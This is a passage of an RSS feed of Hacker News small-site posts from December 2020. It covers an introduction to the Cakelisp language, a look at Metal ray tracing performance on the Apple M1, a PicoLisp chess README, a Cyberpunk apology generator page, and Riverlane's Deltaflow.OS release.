<p>It is useful to go over the goals in detail so you can understand my decisions.</p>
<h2 id="uncompromised-performance">Uncompromised performance</h2>
<p>This means no garbage collection, no type boxing/unboxing, etc. Fewer abstractions (besides the ones you create) between you and what the computer is actually doing. Idiomatic usage of the language should result in performance comparable with C (in most cases, it should be identical, because it's only a thin layer on C).</p>
<h2 id="trust-in-you-the-programmer">Trust in you, the programmer</h2>
<p>While languages like Rust offer benefits in terms of security and stability, they cost programmers in terms of productivity. It makes sense to value safety so highly if your code is safety-critical (operating systems, aerospace, automotive, etc.), but it's much less valuable when safety isn't as important (e.g. in games).</p>
<p>In a perfect world all programs would be as robust as space flight software, but in reality, that level of robustness is unnecessary for most programs. It's important to realize that the safety focus is just one way of doing things, not the <em>One True Way</em> or anything.</p>
<h2 id="powerful-code-generation">Powerful code generation</h2>
<p>In my opinion, most languages offer far too little opportunity for the programmer to automate the actual writing of code. This power also relates to trusting in the programmer, because gone wild, the code can become incomprehensible.</p>
<p>The company I work for has what I consider to be a state-of-the-art code generator built for the company's use-case: multi-platform MMOs. It's used very effectively on serialization, RPC, automatic commands, monitoring, automatic documentation, and more.</p>
<p>To give more credence to the use of code generation in games, <a href="https://docs.unrealengine.com/en-US/ProgrammingAndScripting/GameplayArchitecture/index.html">Unreal</a> and <a href="https://www.youtube.com/watch?v=wiJqUWfR90I">Naughty Dog</a> also rely on code generation.</p>
<h2 id="simplify-project-setup-and-management">Simplify project setup and management</h2>
<p>I want to dramatically reduce time wasted on C++ project set-up and "code logistics". This includes setting up build systems, creating header files, adding and managing new C/C++ 3rd party libraries, and other things of that ilk.</p>
<h2 id="gain-more-power">Gain more power!</h2>
<p>Every language has limitations. The lack of straightforward, all-powerful code generation was my primary gripe with C++.</p>
<p>For example, automatically creating function and structure bindings using C++ template metaprogramming is very complex. These are two very useful tools in game development: function bindings for commands, scripting languages, and RPC; structure bindings for serialization or game monitors.</p>
<p>I also wanted features like hot-reloading (being able to load new versions of the code without restarting the program/losing runtime state). Cakelisp made it possible to implement hot-reloading entirely in "user-space", thanks to code modification.</p>
<h2 id="have-my-cake-and-eat-it-too.">"Have my cake and eat it too."</h2>
<p>By this I mean lose little-to-nothing on metrics I care about, which include build time, runtime performance, overall complexity, and various other things. I looked into several languages in my <a href="https://macoy.me/code/macoy/LanguageTests">LanguageTests</a> experiment and found they all had major drawbacks I couldn't accept.</p>
<h2 id="unexpected-freedom">Unexpected freedom</h2>
<p>I did not realize when I started Cakelisp how freeing it felt. All of the sudden, I got to decide what made sense to <em>me</em>, not what made sense to previous language designers.</p>
<h3 id="freedom-in-syntax">Freedom in syntax</h3>
<p>A simple example is type declarations. In C:</p>

<p>The same variable, in Cakelisp:</p>

<p>In my opinion C type declarations are much harder to parse than my explicit type declarations. You need to work backwards from the name to properly interpret the type. The parentheses do add more typing, but they're more clear, machine-parseable, and can be read naturally (e.g. read left to right "pointer to constant character" vs. C's "constant character pointer", which seems worse in my mind).</p>
<p>My form also handles arrays as part of the type: <code>(var my-array ([] 5 int))</code> rather than <code>int myArray[5];</code>, another way it is more consistent, readable, and parsable.</p>
<p>I chose to swap the order of name and type because it places more emphasis on the name. A well-written program will convey more useful information in the name than in the type, so it makes sense to me to have it come first for the reader.</p>
<h3 id="freedom-in-process">Freedom in process</h3>
<p>I also found that having an executable which preprocesses my code exactly how I want it opens the door to a huge amount of awesome features:</p>
<ul>
<li>Compile-time code execution. "Macros" and "Generators" are defined in-line with the rest of your code, making them feel like a natural part of your code. Defining them in-line makes it acceptable to add one-off macros, whereas adding such a thing to an external code generator would quickly become unmaintainable</li>
<li>Build optimization. A recent idea I discovered is automatically creating precompiled headers for large batches of 3rd-party headers. This would be a complex task that would need to be integrated in whatever build system you use, whereas Cakelisp can have it built-in</li>
<li>Other data processing. Compile-time code execution means you can do things like prepare assets, download 3rd-party code, run tests, etc. without having to set up all these additional tools</li>
</ul>

<p>I was inspired by Naughty Dog's use of <a href="https://en.wikipedia.org/wiki/Game_Oriented_Assembly_Lisp">Game Oriented Assembly Lisp</a>, GOOL, and <a href="https://www.youtube.com/watch?v=oSmqbnhHp1c">Racket/Scheme</a> (on their modern titles). I've also taken several ideas from Jonathan Blow's <a href="https://www.youtube.com/user/jblow888">talks on Jai</a>.</p>
<p>I'm a software engineer in the game industry. I've been working since July 2015 at a studio that makes cross-platform MMOs. The company has a custom engine written in C (with some C++).</p>
<p>I <a href="https://macoy.me/code/macoy/LanguageTests">experimented</a> with other languages before deciding I needed to write my own.</p>

<p>Now that my goals are clear, I will show you how I approached achieving them.</p>
<h2 id="notation">Notation</h2>
<p>Cakelisp uses an <a href="https://en.wikipedia.org/wiki/S-expression">S-expression</a>-style notation. Here is some Cakelisp code from <a href="https://macoy.me/code/macoy/gamelib/src/branch/master/test/src/VocalGame.cake">VocalGame</a>:</p>

<p>There are a few things you can notice from reading this code:</p>
<ul>
<li>Types. Cakelisp is strongly- and explicitly-typed. I prefer reading code with explicit types because I can better imagine what the computer is actually doing, and what possibilities I have with each variable</li>
<li>Name-type order. I talked about this in a previous section. I wanted to emphasize the name of a variable for conveying meaning, especially when you may have many variables of the same type</li>
<li>Explicit <code>return</code>. I find I prefer code where return points are made explicit. Lisp will implicitly return the result of the last evaluation</li>
<li>Lisp-y style. The parentheses, plus keywords like <code>unless</code>, <code>defun</code>, <code>var</code>, <code>at</code>, and <code>incr</code>. I matched Lisp only when I didn't have strong opinions for a better notation. I am not trying to create something which is compatible with existing Lisps</li>
<li>C types and function calls. Cakelisp has seamless C interop, which means Cakelisp's "standard library" <em>is</em> C's standard library. No bindings had to be written to use the C types or make the function calls</li>
</ul>
<p>You can read more Cakelisp code in <a href="https://macoy.me/code/macoy/gamelib/src/branch/master/src">Gamelib</a>.</p>
<p>You should think of Cakelisp more as "C in S-expressions" rather than "Lisp with C performance". If you know C, you'll have a relatively smooth transition to Cakelisp. If you only know Lisp, you're going to have a rougher time.</p>
<h3 id="why-s-expressions">Why S-expressions?</h3>
<p>When I set out to make Cakelisp, I decided on S-expressions syntax for several reasons:</p>
<ul>
<li>Parsability. S-expressions shift the burden of creating a syntax tree onto the programmer. This does result on more work for the human, but I value its extremely explicit nature. It also facilitates simpler tokenization, domain-specific-language implementation, and external tool support</li>
<li>Consistency. There are only four types of tokens in Cakelisp: open and close parenthesis, symbol, and string. The consistency is admittedly limiting, so things like paths (<code>myThing-&gt;member.member</code>) become much more verbose to type, unfortunately. However, this limitation keeps Cakelisp code parsable, and has an elegant feel that I appreciate</li>
</ul>
<p>I don't believe there is one notation to rule them all, especially after I've encountered the disadvantages of using S-exprs. I'm still happy with the decision though, and it does give Cakelisp a novel and distinguishing characteristic from the many â€¦</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://macoy.me/blog/programming/CakelispIntro">https://macoy.me/blog/programming/CakelispIntro</a></em></p>]]>
            </description>
            <link>https://macoy.me/blog/programming/CakelispIntro</link>
            <guid isPermaLink="false">hacker-news-small-sites-25491568</guid>
            <pubDate>Mon, 21 Dec 2020 02:28:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Dive into Ray Tracing Performance on the Apple M1]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25491450">thread link</a>) | @Twinklebear
<br/>
December 20, 2020 | https://www.willusher.io/graphics/2020/12/20/rt-dive-m1 | <a href="https://web.archive.org/web/*/https://www.willusher.io/graphics/2020/12/20/rt-dive-m1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<div>
		
<p>The Apple M1 available in the MacBook Air, MacBook Pro 13â€, and Mac Mini has
been the focus of a ton of benchmarking writeups and blog posts about
the new chip. The performance overall, and especially performance/watt,
that Apple has achieved with the chip is very impressive.
As a ray tracing person, what caught my eye the most was the
performance AnandTech reported in their
<a href="https://www.anandtech.com/show/16252/mac-mini-apple-m1-tested/2">CineBench benchmarks</a>.
These scores were 1.6x higher than I got on my old Haswell desktop and 2x
higher than my new Tiger Lake laptop!
I had also been interested in trying out the new
<a href="https://developer.apple.com/videos/play/wwdc2020/10012/">ray tracing API for Metal</a>
that was announced at WWDC this year,
which bears some resemblance to the DirectX, Vulkan, and OptiX GPU ray tracing APIs.
So, I decided to pick up a Mac Mini to do some testing
on my own interactive path tracing project,
<a href="https://github.com/Twinklebear/ChameleonRT">ChameleonRT</a>,
and to get it running on the new Metal ray tracing API.
In this post, weâ€™ll take a look at the new Metal ray tracing
API to see how it lines up with DirectX, Vulkan, OptiX and Embree,
then weâ€™ll make some fair (and some extremely unfair) ray tracing
performance comparisons against the M1.</p>

<!--more-->



<p><a href="https://github.com/Twinklebear/ChameleonRT">ChameleonRT</a> is an open source
interactive path tracer that Iâ€™ve been working on to learn the different ray tracing APIs,
and to provide an example or starting point for myself and others working with them
in other projects.
ChameleonRT provides backends for the GPU ray tracing APIs:
<a href="https://github.com/Twinklebear/ChameleonRT/tree/master/dxr">DirectX Ray Tracing</a>,
<a href="https://github.com/Twinklebear/ChameleonRT/tree/master/vulkan">Vulkan KHR Ray Tracing</a>,
and <a href="https://github.com/Twinklebear/ChameleonRT/tree/master/optix">OptiX 7</a>.
Through the work discussed in this post, it also has a new
<a href="https://github.com/Twinklebear/ChameleonRT/tree/master/metal">Metal</a> GPU backend.
ChameleonRT also has an <a href="https://github.com/Twinklebear/ChameleonRT/tree/master/embree">Embree backend</a>
for fast multi-threaded and SIMD accelerated ray tracing on CPUs through
<a href="https://www.embree.org/">Embree</a>, <a href="https://ispc.github.io/">ISPC</a>, and <a href="https://github.com/oneapi-src/oneTBB">TBB</a>.
The rendering code in each backend is nearly identical and they produce almost pixel exact outputs,
with some possible small differences due to subtle differences in the ray tracing
libraries or shader languages.</p>

<p>ChameleonRT is different from popular ray tracing benchmark applications like
<a href="https://www.maxon.net/en/cinebench">CineBench</a>, <a href="http://www.luxmark.info/">LuxMark</a>,
and <a href="https://opendata.blender.org/">Blender Benchmark</a>, in that ChameleonRT is
a minimal interactive path tracer. CineBench, LuxMark, and Blender Benchmark are excellent
for getting a full picture of what performance to expect from a production film
renderer, as they are production renderers. However, thereâ€™s a lot more going
on in a production renderer than just ray tracing to support the kind of complex
geometries, materials, and effects used in film; and the large code
bases can be challenging to quickly port to a new architecture or API.
ChameleonRT is the exact opposite, supporting just one geometry type,
triangle meshes, and one material type, the Disney BRDF.
The rest of the code is similarly written to achieve interactive path tracing performance,
though I have tried to balance this with how complex the code is to read.
For example, the renderers use iterative ray tracing instead of recursion,
support only a simple sampling strategy, and donâ€™t support alpha cut-out effects.
The use of iterative ray tracing is valuable on both the CPU and GPU, but is
especially important on the GPU, as the
overhead of recursive ray tracing calls in the pipeline can have a significant performance impact.
Similarly, ignoring alpha cut-out effects allows the GPU renderers
to skip using an any hit shader (and the Embree on to skip needing an intersection
filter). The any hit shader (or intersection filter) would be called during
BVH traversal after a candidate intersection with a triangle is found.
In the case that the BVH traversal is hardware accelerated, this ends up
producing a lot amount of back and
forth between the fixed function traversal hardware and the shader cores to run the any hit
shader during traversal, limiting the hardwareâ€™s performance.</p>

<blockquote>
  <p>Whatâ€™s a path tracer? Path tracing is a technique in computer graphics for
rendering photo-realistic images by simulating the light transport in
the scene. It is a Monte Carlo technique, meaning that it randomly samples
light paths emitted from lights in the scene that reach the camera
by bouncing off objects in the scene. This is done by tracing the paths in reverse,
starting from the camera and tracing the path back through the scene.
A large number of light paths need to be sampled to produce a noise-free
image. Path tracing is not restricted to photo-realism, and is the
core rendering algorithm used in major film renderers, such as: Pixarâ€™s Renderman,
Disneyâ€™s Hyperion, Autodeskâ€™s Arnold, and Wetaâ€™s Manuka.
See <a href="https://en.wikipedia.org/wiki/Path_tracing">Wikipedia</a> for more.</p>
</blockquote>



<p>The new ray tracing API in Metal will be familiar to those whoâ€™ve used inline ray
tracing in DirectX or Vulkan. For a good introduction to Metalâ€™s API, check out the <a href="https://developer.apple.com/videos/play/wwdc2020/10012/">Discover ray tracing
with Metal</a> video from WWDC 2020,
and the <a href="https://developer.apple.com/documentation/metal/accelerating_ray_tracing_using_metal?language=objc">accompanying sample</a>.
Inline ray tracing allows applications to make ray tracing calls in any shader stage,
e.g., fragment/pixel shaders, vertex shaders, compute shaders, etc.
Inline ray tracing allows ray tracing effects, for example accurate reflections and shadows,
to be integrated into the regular rasterization pipeline.
Inline ray tracing can also be used from a compute shader to implement a standalone
path tracing based renderer. ChameleonRT is a standalone path tracer, and takes
the compute shader approach for Metal.</p>

<p>At a high-level, ray tracing in Metal proceeds as follows: you upload your
geometry data, build bottom-level primitive acceleration structures over them, then create instances
referencing those acceleration structures and build a top-level acceleration structure over
the instances.
To render the scene you dispatch a compute shader and trace rays against the top-level
acceleration structure to get back intersection results. The intersection results provide
you with the intersected primitive and geometry IDs, and if using instancing, the instance ID.
Your shader can then look up the geometry data for the object that was hit and shade it,
after which it can continue tracing the path.</p>

<p>At this time Metal only supports inline ray tracing, in contrast to DirectX and Vulkan, which
also provide support for ray tracing pipelines. Ray tracing pipelines are used
to implement standalone ray tracing renderers, and is the approach ChameleonRT
uses in its DirectX and Vulkan backends.
OptiX only supports ray tracing pipelines.
Ray tracing pipelines require the creation of a Shader Binding Table to
provide the API with a table of functions to call when specific objects
in the scene are intersected. The SBT can be difficult to setup and debug,
and is a common point of difficulty for developers learning these APIs.
For more information about the SBT, check out my post
<a href="https://www.willusher.io/graphics/2019/11/20/the-sbt-three-ways">â€œThe RTX Shader Binding Table Three Waysâ€</a>.
However, the potential benefit of the SBT is that the GPU can reorder or group function
calls to reduce thread divergence. With inline ray tracing, the developer
must do this themselves, or do without
(check out another video from <a href="https://developer.apple.com/videos/play/wwdc2020/10013/">WWDC20</a>
for information here).
Right now, ChameleonRT does not do any reordering to reduce divergence.</p>

<p>Those familiar with Metal may know of the previous
<a href="https://developer.apple.com/documentation/metalperformanceshaders/metal_for_accelerating_ray_tracing?language=objc">Metal Performance Shaders ray intersector</a>.
The new support for inline ray tracing improves on this by allowing the renderer
to move entirely to the GPU. The previous ray intersector worked by taking
batches of rays, finding intersections in the scene, and writing these results
back out to memory. Multiple compute shaders would need to be dispatched to
trace the primary rays and create shadow and secondary rays, then trace the shadow rays
and continue the secondary rays while filtering out paths that terminated.
This requires significantly more memory traffic and compute dispatches, introducing overhead
to the renderer. Such an approach is also not well suited to augmenting traditional
rasterization pipelines with ray tracing effects.
Approaches based on tracing and sorting rays and intersection information to extract
coherence are valuable for complex film renderers, and can be implemented efficiently using inline
ray tracing as well.
For example, <a href="https://www.yiningkarlli.com/projects/hyperiondesign.html">Disneyâ€™s Hyperion renderer</a>
uses sorting and batching extensively to
extract coherent workloads from an otherwise incoherent and divergent distribution of rays.
Thereâ€™s also an excellent higher-level <a href="https://youtu.be/frLwRLS_ZR0">video</a> explaining how this
works.</p>

<p>The Metal ray tracing API is quite nice to work with.
It bears a lot of similarity to the other ray tracing APIs, but has been streamlined
to be easier to use.
For example, compare the code required to build and compact a BVH in
<a href="https://github.com/Twinklebear/ChameleonRT/blob/master/dxr/dxr_utils.cpp#L877-L977">DirectX</a>
or <a href="https://github.com/Twinklebear/ChameleonRT/blob/master/vulkan/vulkanrt_utils.cpp#L46-L214">Vulkan</a>
with <a href="https://github.com/Twinklebear/ChameleonRT/blob/master/metal/metalrt_utils.mm#L318-L396">Metal</a>.
OptiXâ€™s API provides a similar simplification, hereâ€™s the
<a href="https://github.com/Twinklebear/ChameleonRT/blob/master/optix/optix_utils.cpp#L183-L244">BVH build in OptiX</a>
for reference.
Itâ€™s also nice to have templates and C++ style functionality in the shader language,
a feature Metal shares with OptiX, which uses CUDA for the device side code.</p>

<p>This simplicity also has some drawbacks. For example, while in DirectX, Vulkan, and OptiX
you have control over where the acceleration structure memory is allocated,
Metal makes this allocation for you. As a result, you cannot allocate the acceleration
structures on a <code>MTLHeap</code>, and so to make sure theyâ€™re available for your rendering
pipeline, you must individually mark them as used in a loop instead of a single <code>useHeap</code> call.</p>

<figure><pre><code data-lang="objc"><span></span><span>// Use our top level acceleration structure</span>
<span>[</span><span>command_encoder</span> <span>setAccelerationStructure</span><span>:</span><span>bvh</span><span>-&gt;</span><span>bvh</span> <span>atBufferIndex</span><span>:</span><span>1</span><span>];</span>
<span>// Also mark all mesh acceleration structures used, as they're indirectly</span>
<span>// referenced by the top level one</span>
<span>for</span> <span>(</span><span>auto</span> <span>&amp;</span><span>mesh</span> <span>:</span> <span>bvh</span><span>-&gt;</span><span>meshes</span><span>)</span> <span>{</span>
    <span>[</span><span>command_encoder</span> <span>useResource</span><span>:</span><span>mesh</span><span>-&gt;</span><span>bvh</span> <span>usage</span><span>:</span><span>MTLResourceUsageRead</span><span>];</span>
<span>}</span></code></pre></figure>

<p>This can add some overhead if you have a lot of bottom level BVHs, as can be the
case in scenes with many instances.
Itâ€™d be nice to be able to allocate the acceleration structures on a heap, and replace this loop
with a single <code>[command_encoder useHeap:data_heap-&gt;heap];</code></p>

<p>The API is also simplified significantly by not including ray tracing pipelines and
only requiring a Shader Binding Table-esque
structure when implementing custom geometries or other operations that need
to happen â€¦</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.willusher.io/graphics/2020/12/20/rt-dive-m1">https://www.willusher.io/graphics/2020/12/20/rt-dive-m1</a></em></p>]]>
            </description>
            <link>https://www.willusher.io/graphics/2020/12/20/rt-dive-m1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25491450</guid>
            <pubDate>Mon, 21 Dec 2020 02:07:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chess Boom Moves Online]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25491402">thread link</a>) | @jonbaer
<br/>
December 20, 2020 | https://www.bloomberg.com./graphics/2020-chess-boom/ | <a href="https://web.archive.org/web/*/https://www.bloomberg.com./graphics/2020-chess-boom/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
        <section>
            <h3>Why did this happen?</h3>
            <p>Please make sure your browser supports JavaScript and cookies and that you are not blocking them from loading. For more information you can review our <a href="https://www.bloomberg.com./notices/tos">Terms of Service</a> and <a href="https://www.bloomberg.com./notices/tos">Cookie Policy</a>.</p>
        </section>
        <section>
            <h3>Need Help?</h3>
            <p>For inquiries related to this message please <a href="https://www.bloomberg.com./feedback">contact our support team</a> and provide the reference ID below.</p>
            <p>Block reference ID: </p>
        </section>
    </section></div>]]>
            </description>
            <link>https://www.bloomberg.com./graphics/2020-chess-boom/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25491402</guid>
            <pubDate>Mon, 21 Dec 2020 01:57:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[PicoLisp Chess]]>
            </title>
            <description>
<![CDATA[
Score 68 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25491356">thread link</a>) | @simonpure
<br/>
December 20, 2020 | https://software-lab.de/chess/README | <a href="https://web.archive.org/web/*/https://software-lab.de/chess/README">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>|<n>|<b>|<q>|<k>|<b>|<n>|<r>|
      +---+---+---+---+---+---+---+---+
    7 |<p>|</p><p>|</p><p>|</p><p>|</p><p>|</p><p>|</p><p>|</p><p>|
      +---+---+---+---+---+---+---+---+
    6 |   | - |   | - |   | - |   | - |
      +---+---+---+---+---+---+---+---+
    5 | - |   | - |   | - |   | - |   |
      +---+---+---+---+---+---+---+---+
    4 |   | - |   | - |   | - |   | - |
      +---+---+---+---+---+---+---+---+
    3 | - |   | - |   | - |   | - |   |
      +---+---+---+---+---+---+---+---+
    2 | P | P | P | P | P | P | P | P |
      +---+---+---+---+---+---+---+---+
    1 | R | N | B | Q | K | B | N | R |
      +---+---+---+---+---+---+---+---+
        a   b   c   d   e   f   g   h

For a local installation, supply instead of "pil" the actual path like "./pil"
or "../pil21/pil".

The pieces are indicated by the letters 'K'ing, 'Q'ueen, 'R'ook, 'B'ishop,
k'N'ight and 'P'awn, with black pieces in angular brackets.

You can enter your moves with the field names (in lower case) for the "from" and
"to" positions:

: (go e2 e4)

Castling may be entered by just specifying the king's move:

: (go e1 g1)

To promote a pawn to some piece other than a queen, you can specify a class:

: (go h7 h8 +Knight)

To undo one or several moves, enter

: (go -)

and to redo them

: (go +)

To switch sides (and have the computer play against itself), call 'go' without
arguments:

: (go)

The initial board position can be restored with

: (main)

The global variable '*Depth' holds the maximal depth of the alpha-beta tree
search. It defaults to 5. You may change it to some smaller value for a faster
response, or to a larger value for a deeper search:

: (setq *Depth 7)

The same effect can be achieved by passing the desired depth as the first
argument to 'main':

: (main 7)

The second (optional) argument to 'main' is your color ('NIL' for white and 'T'
for black).

To setup some given board position, call 'main' with a list of triples, with
each describing:

   1. The field
   2. The piece's classes
   3. An optional flag to indicate that the piece did not move yet

: (main 5 NIL
   (quote
      (a2 (+White +Pawn) T)
      (b1 (+White +King))
      (d4 (+Black +King)) ) )
   +---+---+---+---+---+---+---+---+
 8 |   | - |   | - |   | - |   | - |
   +---+---+---+---+---+---+---+---+
 7 | - |   | - |   | - |   | - |   |
   +---+---+---+---+---+---+---+---+
 6 |   | - |   | - |   | - |   | - |
   +---+---+---+---+---+---+---+---+
 5 | - |   | - |   | - |   | - |   |
   +---+---+---+---+---+---+---+---+
 4 |   | - |   |<k>|   | - |   | - |
   +---+---+---+---+---+---+---+---+
 3 | - |   | - |   | - |   | - |   |
   +---+---+---+---+---+---+---+---+
 2 | P | - |   | - |   | - |   | - |
   +---+---+---+---+---+---+---+---+
 1 | - | K | - |   | - |   | - |   |
   +---+---+---+---+---+---+---+---+
     a   b   c   d   e   f   g   h

At any time, you can print the current board position in the above format to a
file with

: (ppos "file")

which later can be restored with

: (load "file")


   === PilBox and Web App ===

If you have the PilBox App installed on your Android device, just type "chess"
in the settings and press the "Download" button.

To start the Web application, use

   $ pil chess/main.l -chess~main -go +

Alternatively, you can start it with German localization as

   $ pil chess/main.l -'chess~main "DE" "de"' -go +

then point your browser to http://localhost:8080

In both cases you can interact with the chess board in this way:

   Ã¢â‚¬â€ To enter a move, drag a piece to the new field.
   Ã¢â‚¬â€ A click on the board does an auto-move and then switches sides.
   Ã¢â‚¬â€ The search depth can be changed with a drop-down menu.
   Ã¢â‚¬â€ The "New" button starts a new game, and the "Undo" and "Redo" buttons
     navigate in the history.
   Ã¢â‚¬â€ The text "White" or "Black" indicate who is to move next. It changes to
     "White ..." or "Black ..." while the computer is thinking.
   Ã¢â‚¬â€ After a move, the moved piece and the old and new positions are indicated
     above that text.
   Ã¢â‚¬â€ "Save" and "Load" allow a single (!) save/restore of a game position.

The "Setup" button switches to edit mode and allows you to change the position
manually:

   Ã¢â‚¬â€ A click on a piece removes it from the board.
   Ã¢â‚¬â€ Dragging a piece moves it to another field.
   Ã¢â‚¬â€ A new piece can be placed on the board by dragging it from the setup area.
   Ã¢â‚¬â€ The "Clear" button removes all pieces from the board.
   Ã¢â‚¬â€ The "New" button sets up all pieces for a new game.
   Ã¢â‚¬â€ The "Game" button switches back to play mode.

As in any PilBox app, you can go to the settings (wheel icon on top right) and

   Ã¢â‚¬â€ switch to another language in the "Language" tab or
   Ã¢â‚¬â€ view the App's source code by clicking on the app name "chess" in the
     "PILs" tab.


   === Credits and Copying ===

The pieces and board colors are from https://chessboardjs.com

The icon is from
   https://commons.m.wikimedia.org/wiki/File:Chess logo.PNG

(MIT/X11 License)
</k></p></r></n></b></k></q></b></n></div></div>]]>
            </description>
            <link>https://software-lab.de/chess/README</link>
            <guid isPermaLink="false">hacker-news-small-sites-25491356</guid>
            <pubDate>Mon, 21 Dec 2020 01:51:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cyberpunk Apology Generator]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25491304">thread link</a>) | @rossmohax
<br/>
December 20, 2020 | https://foone.github.io/Cyberpunk2077Apology/ | <a href="https://web.archive.org/web/*/https://foone.github.io/Cyberpunk2077Apology/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>
			<div>
				<div>

						<!-- copyright footnote -->
								<p><a href="https://github.com/foone/Cyberpunk2077Apology">Code</a> by <a href="https://twitter.com/Foone">@Foone</a><span id="extra-contrib"></span>, content by <a href="#">somebody</a><span id="content-contrib"></span>. 
								<a id="playlink" href=""><span id="how-to-use"><!-- this gets replaced by scripts.js based on the generator, but the default option is "Play this game" --></span> on 
								<span id="where-to-use"><!-- This gets replaced by scripts.js based on the generator, and the default is "the Internet Archive" --></span>!</a></p><div id="main-container">
							<div>
								

								<!-- Screenshot/Canvas -->
								<canvas id="death">No canvas!</canvas>
								<canvas id="border">No canvas!</canvas>

								<!-- Customization -->
								<p>
									
									<a href="#" id="save"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgAQMAAADYVuV7AAAABlBMVEX///8AAABVwtN+AAAAAWJLR0QAiAUdSAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAAd0SU1FB+IBBRQ0G7eG+BwAAACiSURBVDjLzdIxCsMwDAVQgQePOkIuIvDRmqP5Br2CS4eM8ZhBxHUUt8gE09KQtNoefGRbFgAkKQapFbNGqtBreAHbAGBTEEyCMSoM0wvdcGeF26wQksZFw2l0ZwDsB1hGsAfrYP8G7Ysa+ey3DarY7mcfN7ey606vcvoaPymMLRC1gDlIVMIVjM9JKuEKEJGJHG+xRHIL2AIjXo1/nqNxfj0AmAoaBZSWo6oAAAAASUVORK5CYII=" width="96" height="96" alt="Save image"></a>
								</p>
								<p><label>Automatic wordwrapping</label></p>
								
							</div>
							
						</div>
				</div>
			</div>
		</div>

	</div></div>]]>
            </description>
            <link>https://foone.github.io/Cyberpunk2077Apology/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25491304</guid>
            <pubDate>Mon, 21 Dec 2020 01:40:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[First release of quantum operating system, Deltaflow]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 43 (<a href="https://news.ycombinator.com/item?id=25490816">thread link</a>) | @kristianpaul
<br/>
December 20, 2020 | https://www.riverlane.com/news/2020/12/riverlane-release-first-version-of-quantum-operating-system-deltaflow-os/ | <a href="https://web.archive.org/web/*/https://www.riverlane.com/news/2020/12/riverlane-release-first-version-of-quantum-operating-system-deltaflow-os/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
            <div>
                <article>
                    

                    <div>
                        
                        <div>
                            <p>In May 2020, Riverlane revealed that they will lead a consortium which has been <a href="https://www.riverlane.com/news/2020/05/uk-companies-to-build-radically-new-operating-system-for-quantum-computers/">awarded a Â£7.6m grant to build a radically new operating system</a> for quantum computers. We marked a â€˜hello worldâ€™ moment in September, with the first <a href="https://www.riverlane.com/news/2020/09/commercial-breakthrough-following-success-of-deltaflow-os-trials/">successful trials of Deltaflow.OS</a>, using quantum hardware belonging to leading trapped-ion company, <a href="https://www.oxionics.com/">Oxford Ionics</a>.</p>
<p>The latest milestone is the public release of the first version of Deltaflow.OS; â€˜Deltaflow-on-ARTIQâ€™. The product has been built to enable quantum hardware companies as well as algorithm and app developers to accelerate their research by making collaboration easier and reduce down-time in labs. This version uses simulated hardware and <a href="http://m-labs.hk/experiment-control/artiq/">ARTIQ</a> as a backend. ARTIQ is a control system which is widely used in the trapped-ion community.</p>
<p>Deltaflow-on-ARTIQ consists of the Deltaflow language (Deltalanguage), and various hardware models on which the language can be run, including an emulator of the ARTIQ control system. The Deltalanguage lets users define a graph of different hardware nodes corresponding to the type of hardware elements found in labs. After defining a programme, users can test it on increasingly realistic hardware models.</p>
<p>Robert JÃ¶rdens of M-Labs commented, â€œMy hands are twitching because I really want to see and try that&nbsp;emulator and Deltaflow. There are so many valuable pieces in there.â€</p>
<p>A first <a href="https://vimeo.com/480247763/d8fd4a0708">public demonstration of Deltaflow.OS</a> took place at the virtual National Quantum Technologies Showcase on 6 November 2020, where the team demonstrated how a Rabi-Oscillation would be performed.</p>
<p>The release of Deltaflow-on-ARTIQ marks a significant step towards Riverlaneâ€™s mission to build a quantum operating system that is high performance, portable across all qubit technologies and scalable to millions of qubits.</p>
<p>Access <a href="https://www.riverlane.com/products/">Deltaflow-on-ARTIQ</a></p>





                        </div>
                    </div>

                </article>
            </div>
        </section></div>]]>
            </description>
            <link>https://www.riverlane.com/news/2020/12/riverlane-release-first-version-of-quantum-operating-system-deltaflow-os/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25490816</guid>
            <pubDate>Mon, 21 Dec 2020 00:06:10 GMT</pubDate>
        </item>
    </channel>
</rss>
